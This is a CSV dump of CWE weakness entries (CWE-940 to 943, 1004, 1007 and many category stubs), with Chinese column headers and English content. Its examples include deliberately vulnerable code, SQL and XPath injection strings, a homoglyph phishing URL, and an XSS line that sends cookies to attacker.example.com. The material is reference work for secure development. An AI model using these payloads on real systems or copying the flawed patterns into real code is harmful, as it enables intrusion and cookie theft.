cwe_vulnerabilities
名称,定义,常见后果,示范例子,可能的缓解方案
CWE-940: Improper Verification of Source of a Communication Channel,"The product establishes a communication channel to handle an incoming request that has been initiated by an actor, but it does not properly verify that the request is coming from the expected origin.","Scope: Access ControlOther, Impact: Technical Impact:Gain Privileges or Assume Identity; Varies by ContextAn attacker can access any functionality that is inadvertently accessible to the source., Likelihood: ","Example 1This Android application will remove a user account when it receives an intent to do so:(bad code)Example Language:JavaIntentFilter filter = new IntentFilter(""com.example.RemoveUser"");MyReceiver receiver = new MyReceiver();registerReceiver(receiver, filter);public class DeleteReceiver extends BroadcastReceiver {@Overridepublic void onReceive(Context context, Intent intent) {int userID = intent.getIntExtra(""userID"");destroyUserData(userID);}}This application does not check the origin of the intent, thus allowing any malicious application to remove a user. Always check the origin of an intent, or create an allowlist of trusted applications using the manifest.xml file.Example 2These Android and iOS applications intercept URL loading within a WebView and perform special actions if a particular URL scheme is used, thus allowing the Javascript within the WebView to communicate with the application:(bad code)Example Language:Java// Android@Overridepublic boolean shouldOverrideUrlLoading(WebView view, String url){if (url.substring(0,14).equalsIgnoreCase(""examplescheme:"")){if(url.substring(14,25).equalsIgnoreCase(""getUserInfo"")){writeDataToView(view, UserData);return false;}else{return true;}}}(bad code)Example Language:Objective-C// iOS-(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType{NSURL *URL = [exRequest URL];if ([[URL scheme] isEqualToString:@""exampleScheme""]){NSString *functionString = [URL resourceSpecifier];if ([functionString hasPrefix:@""specialFunction""]){// Make data available back in webview.UIWebView *webView = [self writeDataToView:[URL query]];}return NO;}return YES;}A call into native code can then be initiated by passing parameters within the URL:(attack code)Example Language:JavaScriptwindow.location = examplescheme://method?parameter=valueBecause the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site.","Phase:  Architecture and DesignUse a mechanism that can validate the identity of the source, such as a certificate, and validate the integrity of data to ensure that it cannot be modified in transit using an Adversary-in-the-Middle (AITM) attack.When designing functionality of actions in the URL scheme, consider whether the action should be accessible to all mobile applications, or if an allowlist of applications to interface with is appropriate."
CWE-941: Incorrectly Specified Destination in a Communication Channel,"The product creates a communication channel to initiate an outgoing request to an actor, but it does not correctly specify the intended destination for that actor.",无常见后果信息,"Example 1This code listens on a port for DNS requests and sends the result to the requesting address.(bad code)Example Language:Pythonsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)sock.bind( (UDP_IP,UDP_PORT) )while true:data = sock.recvfrom(1024)if not data:break(requestIP, nameToResolve) = parseUDPpacket(data)record = resolveName(nameToResolve)sendResponse(requestIP,record)This code sends a DNS record to a requesting IP address. UDP allows the source IP address to be easily changed ('spoofed'), thus allowing an attacker to redirect responses to a target, which may be then be overwhelmed by the network traffic.",无可能的缓解方案
CWE-942: Permissive Cross-domain Policy with Untrusted Domains,The product uses a cross-domain policy file that includes domains that should not be trusted.,"Scope: ConfidentialityIntegrityAvailabilityAccess Control, Impact: Technical Impact:Execute Unauthorized Code or Commands; Bypass Protection Mechanism; Read Application Data; Varies by ContextAn attacker may be able to bypass the web browser's same-origin policy. An attacker can exploit the weakness to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running ActiveX controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content., Likelihood: ","Example 1These cross-domain policy files mean to allow Flash and Silverlight applications hosted on other domains to access its data:Flash crossdomain.xml :(bad code)Example Language:XML<cross-domain-policy xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""xsi:noNamespaceSchemaLocation=""http://www.adobe.com/xml/schemas/PolicyFile.xsd""><allow-access-from domain=""*.example.com""/><allow-access-from domain=""*""/></cross-domain-policy>Silverlight clientaccesspolicy.xml :(bad code)Example Language:XML<?xml version=""1.0"" encoding=""utf-8""?><access-policy><cross-domain-access><policy><allow-from http-request-headers=""SOAPAction""><domain uri=""*""/></allow-from><grant-to><resource path=""/"" include-subpaths=""true""/></grant-to></policy></cross-domain-access></access-policy>These entries are far too permissive, allowing any Flash or Silverlight application to send requests. A malicious application hosted on any other web site will be able to send requests on behalf of any user tricked into executing it.","Phase:  Architecture and DesignStrategy:  Attack Surface ReductionAvoid using wildcards in the cross-domain policy file. Any domain matching the wildcard expression will be implicitly trusted, and can perform two-way interaction with the target server.Phases:  Architecture and Design; OperationStrategy:  Environment HardeningFor Flash, modify crossdomain.xml to use meta-policy options such as 'master-only' or 'none' to reduce the possibility of an attacker planting extraneous cross-domain policy files on a server.Phases:  Architecture and Design; OperationStrategy:  Attack Surface ReductionFor Flash, modify crossdomain.xml to use meta-policy options such as 'master-only' or 'none' to reduce the possibility of an attacker planting extraneous cross-domain policy files on a server."
CWE-943: Improper Neutralization of Special Elements in Data Query Logic,"The product generates a query intended to access or manipulate data in a data store such as a database, but it does not neutralize or incorrectly neutralizes special elements that can modify the intended logic of the query.","Scope: ConfidentialityIntegrityAvailabilityAccess Control, Impact: Technical Impact:Bypass Protection Mechanism; Read Application Data; Modify Application Data; Varies by Context, Likelihood: ","Example 1The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where owner matches the user name of the currently-authenticated user.(bad code)Example Language:C#...string userName = ctx.getAuthenticatedUserName();string query = ""SELECT * FROM items WHERE owner = '"" + userName + ""' AND itemname = '"" + ItemName.Text + ""'"";sda = new SqlDataAdapter(query, conn);DataTable dt = new DataTable();sda.Fill(dt);...The query that this code intends to execute follows:(informative)SELECT * FROM items WHERE owner = <userName> AND itemname = <itemName>;However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string:(attack code)name' OR 'a'='afor itemName, then the query becomes the following:(attack code)SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name' OR 'a'='a';The addition of the:(attack code)OR 'a'='acondition causes the WHERE clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:(attack code)SELECT * FROM items;This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the items table, regardless of their specified owner.Example 2The code below constructs an LDAP query using user input address data:(bad code)Example Language:Javacontext = new InitialDirContext(env);String searchFilter = ""StreetAddress="" + address;NamingEnumeration answer = context.search(searchBase, searchFilter, searchCtls);Because the code fails to neutralize the address string used to construct the query, an attacker can supply an address that includes additional LDAP queries.Example 3Consider the following simple XML document that stores authentication information and a snippet of Java code that uses XPath query to retrieve authentication information:(informative)Example Language:XML<users><user><login>john</login><password>abracadabra</password><home_dir>/home/john</home_dir></user><user><login>cbc</login><password>1mgr8</password><home_dir>/home/cbc</home_dir></user></users>The Java code used to retrieve the home directory based on the provided credentials is:(bad code)Example Language:JavaXPath xpath = XPathFactory.newInstance().newXPath();XPathExpression xlogin = xpath.compile(""//users/user[login/text()='"" + login.getUserName() + ""' and password/text() = '"" + login.getPassword() + ""']/home_dir/text()"");Document d = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(new File(""db.xml""));String homedir = xlogin.evaluate(d);Assume that user ""john"" wishes to leverage XPath Injection and login without a valid password. By providing a username ""john"" and password ""' or ''='"" the XPath expression now becomes(attack code)//users/user[login/text()='john' or ''='' and password/text() = '' or ''='']/home_dir/text()This lets user ""john"" login without a valid password, thus bypassing authentication.",无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Access Management,This category identifies Software Fault Patterns (SFPs) within the Access Management cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Insecure Resource Access,This category identifies Software Fault Patterns (SFPs) within the Insecure Resource Access cluster (SFP35).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Insecure Resource Permissions,This category identifies Software Fault Patterns (SFPs) within the Insecure Resource Permissions cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Authentication Bypass,This category identifies Software Fault Patterns (SFPs) within the Authentication Bypass cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Digital Certificate,This category identifies Software Fault Patterns (SFPs) within the Digital Certificate cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Faulty Endpoint Authentication,This category identifies Software Fault Patterns (SFPs) within the Faulty Endpoint Authentication cluster (SFP29).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Hardcoded Sensitive Data,This category identifies Software Fault Patterns (SFPs) within the Hardcoded Sensitive Data cluster (SFP33).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Insecure Authentication Policy,This category identifies Software Fault Patterns (SFPs) within the Insecure Authentication Policy cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Missing Authentication,This category identifies Software Fault Patterns (SFPs) within the Missing Authentication cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Missing Endpoint Authentication,This category identifies Software Fault Patterns (SFPs) within the Missing Endpoint Authentication cluster (SFP30).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Multiple Binds to the Same Port,This category identifies Software Fault Patterns (SFPs) within the Multiple Binds to the Same Port cluster (SFP32).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Unrestricted Authentication,This category identifies Software Fault Patterns (SFPs) within the Unrestricted Authentication cluster (SFP34).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Channel Attack,This category identifies Software Fault Patterns (SFPs) within the Channel Attack cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Protocol Error,This category identifies Software Fault Patterns (SFPs) within the Protocol Error cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Broken Cryptography,This category identifies Software Fault Patterns (SFPs) within the Broken Cryptography cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Weak Cryptography,This category identifies Software Fault Patterns (SFPs) within the Weak Cryptography cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Ambiguous Exception Type,This category identifies Software Fault Patterns (SFPs) within the Ambiguous Exception Type cluster (SFP5).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Incorrect Exception Behavior,This category identifies Software Fault Patterns (SFPs) within the Incorrect Exception Behavior cluster (SFP6).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Unchecked Status Condition,This category identifies Software Fault Patterns (SFPs) within the Unchecked Status Condition cluster (SFP4).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Exposed Data,This category identifies Software Fault Patterns (SFPs) within the Exposed Data cluster (SFP23).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Exposure Temporary File,This category identifies Software Fault Patterns (SFPs) within the Exposure Temporary File cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Insecure Session Management,This category identifies Software Fault Patterns (SFPs) within the Insecure Session Management cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Other Exposures,This category identifies Software Fault Patterns (SFPs) within the Other Exposures cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: State Disclosure,This category identifies Software Fault Patterns (SFPs) within the State Disclosure cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Covert Channel,This category identifies Software Fault Patterns (SFPs) within the Covert Channel cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Faulty Memory Release,This category identifies Software Fault Patterns (SFPs) within the Faulty Memory Release cluster (SFP12).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Faulty Buffer Access,This category identifies Software Fault Patterns (SFPs) within the Faulty Buffer Access cluster (SFP8).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Faulty Pointer Use,This category identifies Software Fault Patterns (SFPs) within the Faulty Pointer Use cluster (SFP7).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Faulty String Expansion,This category identifies Software Fault Patterns (SFPs) within the Faulty String Expansion cluster (SFP9).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Improper NULL Termination,This category identifies Software Fault Patterns (SFPs) within the Improper NULL Termination cluster (SFP11).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Incorrect Buffer Length Computation,This category identifies Software Fault Patterns (SFPs) within the Incorrect Buffer Length Computation cluster (SFP10).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Architecture,This category identifies Software Fault Patterns (SFPs) within the Architecture cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Compiler,This category identifies Software Fault Patterns (SFPs) within the Compiler cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Design,This category identifies Software Fault Patterns (SFPs) within the Design cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Implementation,This category identifies Software Fault Patterns (SFPs) within the Implementation cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Failed Chroot Jail,This category identifies Software Fault Patterns (SFPs) within the Failed Chroot Jail cluster (SFP17).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Link in Resource Name Resolution,This category identifies Software Fault Patterns (SFPs) within the Link in Resource Name Resolution cluster (SFP18).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Path Traversal,This category identifies Software Fault Patterns (SFPs) within the Path Traversal cluster (SFP16).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Failure to Release Resource,This category identifies Software Fault Patterns (SFPs) within the Failure to Release Resource cluster (SFP14).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Faulty Resource Use,This category identifies Software Fault Patterns (SFPs) within the Faulty Resource Use cluster (SFP15).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Life Cycle,This category identifies Software Fault Patterns (SFPs) within the Life Cycle cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Unrestricted Consumption,This category identifies Software Fault Patterns (SFPs) within the Unrestricted Consumption cluster (SFP13).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Missing Lock,This category identifies Software Fault Patterns (SFPs) within the Missing Lock cluster (SFP19).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Multiple Locks/Unlocks,This category identifies Software Fault Patterns (SFPs) within the Multiple Locks/Unlocks cluster (SFP21).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Race Condition Window,This category identifies Software Fault Patterns (SFPs) within the Race Condition Window cluster (SFP20).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Unrestricted Lock,This category identifies Software Fault Patterns (SFPs) within the Unrestricted Lock cluster (SFP22).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Tainted Input to Command,This category identifies Software Fault Patterns (SFPs) within the Tainted Input to Command cluster (SFP24).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Tainted Input to Environment,This category identifies Software Fault Patterns (SFPs) within the Tainted Input to Environment cluster (SFP27).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Faulty Input Transformation,This category identifies Software Fault Patterns (SFPs) within the Faulty Input Transformation cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Incorrect Input Handling,This category identifies Software Fault Patterns (SFPs) within the Incorrect Input Handling cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Tainted Input to Variable,This category identifies Software Fault Patterns (SFPs) within the Tainted Input to Variable cluster (SFP25).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Feature,This category identifies Software Fault Patterns (SFPs) within the Feature cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Security,This category identifies Software Fault Patterns (SFPs) within the Security cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Information Loss,This category identifies Software Fault Patterns (SFPs) within the Information Loss cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Glitch in Computation,This category identifies Software Fault Patterns (SFPs) within the Glitch in Computation cluster (SFP1).,无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: DEPRECATED: Weaknesses without Software Fault Patterns,"This view has been deprecated. It was based on gaps in another view (CWE-888) related to research that is no longer updated, but was complete with respect to CWE at the time it was conducted.",无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: Research Concepts,"This view is intended to facilitate research into weaknesses, including their inter-dependencies, and can be leveraged to systematically identify theoretical gaps within CWE. It is mainly organized according to abstractions of behaviors instead of how they can be detected, where they appear in code, or when they are introduced in the development life cycle. By design, this view is expected to include every weakness within CWE.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Use of an Improper API,This category identifies Software Fault Patterns (SFPs) within the Use of an Improper API cluster (SFP3).,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SFP Secondary Cluster: Unexpected Entry Points,This category identifies Software Fault Patterns (SFPs) within the Unexpected Entry Points cluster.,无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: Weaknesses for Simplified Mapping of Published Vulnerabilities,"CWE entries in this view (graph) may be used to categorize potential weaknesses within sources that handle public, third-party vulnerability information, such as the National Vulnerability Database (NVD). By design, this view is incomplete. It is limited to a small number of the most commonly-seen weaknesses, so that it is easier for humans to use. This view uses a shallow hierarchy of two levels in order to simplify the complex navigation of the entire CWE corpus.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag,"The product uses a cookie to store sensitive information, but the cookie is not marked with the HttpOnly flag.","Scope: Confidentiality, Impact: Technical Impact:Read Application DataIf the HttpOnly flag is not set, then sensitive information stored in the cookie may be exposed to unintended parties., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Gain Privileges or Assume IdentityIf the cookie in question is an authentication cookie, then not setting the HttpOnly flag may allow an adversary to steal authentication data (e.g., a session ID) and assume the identity of the user., Likelihood: ","Example 1In this example, a cookie is used to store a session ID for a client's interaction with a website. The intention is that the cookie will be sent to the website with each request made by the client.The snippet of code below establishes a new cookie to hold the sessionID.(bad code)Example Language:JavaString sessionID = generateSessionId();Cookie c = new Cookie(""session_id"", sessionID);response.addCookie(c);The HttpOnly flag is not set for the cookie. An attacker who can perform XSS could insert malicious script such as:(attack code)Example Language:JavaScriptdocument.write('<img src=""http://attacker.example.com/collect-cookies?cookie=' + document.cookie . '"">'When the client loads and executes this script, it makes a request to the attacker-controlled web site. The attacker can then log the request and steal the cookie.To mitigate the risk, use the setHttpOnly(true) method.(good code)Example Language:JavaString sessionID = generateSessionId();Cookie c = new Cookie(""session_id"", sessionID);c.setHttpOnly(true);response.addCookie(c);","Phase:  ImplementationLeverage the HttpOnly flag when setting a sensitive cookie in a response.Effectiveness: HighNote:While this mitigation is effective for protecting cookies from a browser's own scripting engine, third-party components or plugins may have their own engines that allow access to cookies. Attackers might also be able to use XMLHTTPResponse to read the headers directly and obtain the cookie."
CWE CATEGORY: 7PK - Input Validation and Representation,"This category represents one of the phyla in the Seven Pernicious Kingdoms vulnerability classification. It includes weaknesses that exist when an application does not properly validate or represent input. According to the authors of the Seven Pernicious Kingdoms, ""Input validation and representation problems are caused by metacharacters, alternate encodings and numeric representations. Security problems result from trusting input.""",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Bad Coding Practices,"Weaknesses in this category are related to coding practices that are deemed unsafe and increase the chances that an exploitable vulnerability will be present in the application. These weaknesses do not directly introduce a vulnerability, but indicate that the product has not been carefully developed or maintained. If a program is complex, difficult to maintain, not portable, or shows evidence of neglect, then there is a higher likelihood that weaknesses are buried in the code.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-1007: Insufficient Visual Distinction of Homoglyphs Presented to User,"The product displays information or identifiers to a user, but the display mechanism does not make it easy for the user to distinguish between visually similar or identical glyphs (homoglyphs), which may cause the user to misinterpret a glyph and perform an unintended, insecure action.","Scope: IntegrityConfidentiality, Impact: Technical Impact:OtherAn attacker may ultimately redirect a user to a malicious website, by deceiving the user into believing the URL they are accessing is a trusted domain. However, the attack can also be used to forge log entries by using homoglyphs in usernames. Homoglyph manipulations are often the first step towards executing advanced attacks such as stealing a user's credentials, Cross-Site Scripting (XSS), or log forgery. If an attacker redirects a user to a malicious site, the attacker can mimic a trusted domain to steal account credentials and perform actions on behalf of the user, without the user's knowledge. Similarly, an attacker could create a username for a website that contains homoglyph characters, making it difficult for an admin to review logs and determine which users performed which actions., Likelihood: ","Example 1The following looks like a simple, trusted URL that a user may frequently access.(attack code)http://www.ÐµxÐ°mÑlÐµ.ÑÐ¾mHowever, the URL above is comprised of Cyrillic characters that look identical to the expected ASCII characters. This results in most users not being able to distinguish between the two and assuming that the above URL is trusted and safe. The ""e"" is actually the ""CYRILLIC SMALL LETTER IE"" which is represented in HTML as the character &#x435, while the ""a"" is actually the ""CYRILLIC SMALL LETTER A"" which is represented in HTML as the character &#x430.  The ""p"", ""c"", and ""o"" are also Cyrillic characters in this example. Viewing the source reveals a URL of ""http://www.&#x435;x&#x430;m&#x440;l&#x435;.&#x441;&#x43e;m"". An adversary can utilize this approach to perform an attack such as a phishing attack in order to drive traffic to a malicious website.Example 2The following displays an example of how creating usernames containing homoglyphs can lead to log forgery.Assume an adversary visits a legitimate, trusted domain and creates an account named ""admin"", except the 'a' and 'i' characters are Cyrillic characters instead of the expected ASCII. Any actions the adversary performs will be saved to the log file and look like they came from a legitimate administrator account.(result)123.123.123.123 Ð°dmÑn [17/Jul/2017:09:05:49 -0400] ""GET /example/users/userlist HTTP/1.1"" 401 12846123.123.123.123 Ð°dmÑn [17/Jul/2017:09:06:51 -0400] ""GET /example/users/userlist HTTP/1.1"" 200 4523123.123.123.123 admin [17/Jul/2017:09:10:02 -0400] ""GET /example/users/editusers HTTP/1.1"" 200 6291123.123.123.123 Ð°dmÑn [17/Jul/2017:09:10:02 -0400] ""GET /example/users/editusers HTTP/1.1"" 200 6291Upon closer inspection, the account that generated three of these log entries is ""&#x430;dm&#x456;n"". Only the third log entry is by the legitimate admin account. This makes it more difficult to determine which actions were performed by the adversary and which actions were executed by the legitimate ""admin"" account.","Phase:  ImplementationUse a browser that displays Punycode for IDNs in the URL and status bars, or which color code various scripts in URLs.Due to the prominence of homoglyph attacks, several browsers now help safeguard against this attack via the use of Punycode. For example, Mozilla Firefox and Google Chrome will display IDNs as Punycode if top-level domains do not restrict which characters can be used in domain names or if labels mix scripts for different languages.Phase:  ImplementationUse an email client that has strict filters and prevents messages that mix character sets to end up in a user's inbox.Certain email clients such as Google's GMail prevent the use of non-Latin characters in email addresses or in links contained within emails. This helps prevent homoglyph attacks by flagging these emails and redirecting them to a user's spam folder."
CWE VIEW: Architectural Concepts,This view organizes weaknesses according to common architectural security tactics. It is intended to assist architects in identifying potential mistakes that can be made when designing software.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Audit,Weaknesses in this category are related to the design and architecture of audit-based components of the system. Frequently these deal with logging user activities in order to identify attackers and modifications to the system. The weaknesses in this category could lead to a degradation of the quality of the audit capability if they are not addressed when designing or implementing a secure architecture.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Authenticate Actors,Weaknesses in this category are related to the design and architecture of authentication components of the system. Frequently these deal with verifying the entity is indeed who it claims to be. The weaknesses in this category could lead to a degradation of the quality of authentication if they are not addressed when designing or implementing a secure architecture.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Authorize Actors,"Weaknesses in this category are related to the design and architecture of a system's authorization components. Frequently these deal with enforcing that agents have the required permissions before performing certain operations, such as modifying data. The weaknesses in this category could lead to a degradation of quality of the authorization capability if they are not addressed when designing or implementing a secure architecture.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Cross Cutting,"Weaknesses in this category are related to the design and architecture of multiple security tactics and how they affect a system. For example, information exposure can impact the Limit Access and Limit Exposure security tactics. The weaknesses in this category could lead to a degradation of the quality of many capabilities if they are not addressed when designing or implementing a secure architecture.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Encrypt Data,Weaknesses in this category are related to the design and architecture of data confidentiality in a system. Frequently these deal with the use of encryption libraries. The weaknesses in this category could lead to a degradation of the quality data encryption if they are not addressed when designing or implementing a secure architecture.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Identify Actors,Weaknesses in this category are related to the design and architecture of a system's identification management components. Frequently these deal with verifying that external agents provide inputs into the system. The weaknesses in this category could lead to a degradation of the quality of identification management if they are not addressed when designing or implementing a secure architecture.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Limit Access,"Weaknesses in this category are related to the design and architecture of system resources. Frequently these deal with restricting the amount of resources that are accessed by actors, such as memory, network connections, CPU or access points. The weaknesses in this category could lead to a degradation of the quality of authentication if they are not addressed when designing or implementing a secure architecture.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Limit Exposure,Weaknesses in this category are related to the design and architecture of the entry points to a system. Frequently these deal with minimizing the attack surface through designing the system with the least needed amount of entry points. The weaknesses in this category could lead to a degradation of a system's defenses if they are not addressed when designing or implementing a secure architecture.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Lock Computer,Weaknesses in this category are related to the design and architecture of a system's lockout mechanism. Frequently these deal with scenarios that take effect in case of multiple failed attempts to access a given resource. The weaknesses in this category could lead to a degradation of access to system assets if they are not addressed when designing or implementing a secure architecture.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Manage User Sessions,Weaknesses in this category are related to the design and architecture of session management. Frequently these deal with the information or status about each user and their access rights for the duration of multiple requests. The weaknesses in this category could lead to a degradation of the quality of session management if they are not addressed when designing or implementing a secure architecture.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Validate Inputs,"Weaknesses in this category are related to the design and architecture of a system's input validation components. Frequently these deal with sanitizing, neutralizing and validating any externally provided inputs to minimize malformed data from entering the system and preventing code injection in the input data. The weaknesses in this category could lead to a degradation of the quality of data flow in a system if they are not addressed when designing or implementing a secure architecture.",无常见后果信息,无示范例子,无可能的缓解方案
